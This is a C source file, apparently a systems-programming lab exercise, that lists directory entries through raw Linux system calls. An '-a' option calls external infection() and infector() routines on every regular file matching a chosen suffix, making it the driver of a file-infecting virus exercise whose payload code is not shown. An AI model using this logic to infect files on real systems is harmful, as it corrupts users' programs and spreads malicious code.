#include "util.h"
#include "dirent.h"



#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2

#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define SYS_LSEEK 19
#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SEEK_SET 0
#define O_CREATE 64
#define SYS_EXIT 1

extern int system_call();

extern void infection();
extern void infector();
extern void code_start();
extern void code_end();


 typedef struct dirent_ {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_len;  /* Length of this linux_dirent */
               char           d_name[8];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               
               char           pad;       /* Zero padding byte*/
               char           d_type;    /* File type (only since Linux*/
                                         /* 2.6.4); offset is (d_reclen - 1)*/
               

           }dirent_;



void print(char* str){
     system_call(SYS_WRITE, STDOUT, str, strlen(str));    
}
void printchar(char *str){
     system_call(SYS_WRITE, STDOUT, str, 1);    
}

void printint(char i){
  i = i+48;
  char str[2] = {i, 0};
  print(str);
}


void debugging(char* exp_, char* msg, int toDebag,int mode){

  if(toDebag){
    if(mode==STDIN){
       
        if(*msg=='\n')
            system_call(SYS_WRITE , STDERR , "\n" , 1);
         else
            system_call(SYS_WRITE , STDERR , msg , 1);


    }
    else if(mode==STDOUT){

    }
    else{
      system_call(SYS_WRITE,STDERR, exp_,strlen(exp_));
    system_call(SYS_WRITE,STDERR, ": ",2);
    system_call(SYS_WRITE,STDERR, msg,strlen(msg));
     system_call(SYS_WRITE,STDERR, "\n",1);
       
    }
  }}


int main (int argc , char* argv[], char* envp[]){

     char directoryData[8192];
     int fd;
     int bytesToRead;
     int onlySuffix=0;
     int withInfection=0;
     char* suffix;
      int toDebag=0;
      char* sys_return= "System_Call return num";
      char* sys_id= "System_Call_ID";



    char * code_start_ = itoa((int)code_start);
    print("str of code_start: ");
    print(code_start_);
    print("\n");
    char * code_end_ = itoa((int)code_end);
    print("str of code_end: ");
    print(code_end_);
    print("\n");



     int j;
     for(j=1; j<argc; j++)
     {
      if(strcmp(argv[j],"-s")==0)
      {
        onlySuffix=1;
        suffix=argv[j+1];
      }

      else if(strcmp(argv[j],"-a")==0)
      {
        withInfection=1;
        suffix=argv[j+1];
      }
      else if(strcmp(argv[j],"-d")==0 ) toDebag=1;


     }


     fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
      debugging(sys_return,itoa(fd),toDebag,3);
     debugging(sys_id,itoa(SYS_OPEN),toDebag,3);
     if(fd <0){
      print("Error in: opening DIR\n");
      system_call(SYS_EXIT,0x55,1, 1);
    }
    
     bytesToRead = system_call(SYS_GETDENTS, fd, directoryData, 8192);
       debugging(sys_return,itoa(bytesToRead),toDebag,3);
    debugging(sys_id,itoa(SYS_GETDENTS),toDebag,3);
     if(bytesToRead == -1){
      print("Error in: reads dirctions from DIR to buf\n");
            system_call(SYS_EXIT,0x55,1, 1);
          }
      dirent_ *curDir = directoryData;
    



     int i = 0;
     while(i < bytesToRead){
      char *lastChar= curDir->d_name + strlen(curDir->d_name) -1;
        debugging("lastChar",lastChar,toDebag,3);
         debugging("Name",curDir-> d_name,toDebag,3);
        debugging("Length",itoa(curDir->d_len),toDebag,3);
     if((!onlySuffix && !withInfection ) ||  ( (curDir->d_type==8) && strcmp(lastChar,suffix)==0))
      {
  
        print("Name: ");
        print(curDir-> d_name);
        print("\n");

        if(withInfection){
          infection();
          infector(curDir->d_name);
        }
      }
      i = i + curDir->d_len;
      curDir= directoryData + i;
  
     }

    int returnNum;
     returnNum=system_call(SYS_CLOSE, fd);
       debugging(sys_return,itoa(returnNum),toDebag,3);
    debugging(sys_id,itoa(SYS_CLOSE),toDebag,3);
     print("Done...\n");
     return 0x55;


  



}


